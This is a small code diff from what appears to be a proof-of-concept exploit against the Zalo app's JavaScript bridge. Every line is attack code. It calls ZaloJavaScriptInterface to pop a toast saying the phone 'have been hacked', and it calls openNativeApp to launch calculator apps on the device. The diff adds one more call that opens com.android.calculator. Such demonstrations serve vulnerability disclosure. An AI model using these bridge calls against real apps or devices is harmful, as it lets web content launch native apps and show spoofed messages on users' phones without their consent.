@@ -44,6 +44,8 @@ var callbackfunc = null;
 
 ZaloJavaScriptInterface.jsCall(jstoken,"action.show.toast", "aas",'{"toast":"0xd0ff9...Yolo, Your phone have been hacked, vừng ơi mở calculator ra!"}', null);
 
+ZaloJavaScriptInterface.openNativeApp(jstoken,"com.android.calculator")
+
 ZaloJavaScriptInterface.openNativeApp(jstoken,"com.miui.calculator")
 ZaloJavaScriptInterface.jsCall(jstoken,"action.open.app", "aas",'{"android":{"package":"com.zing.boba"}}', "onJSCall");
 
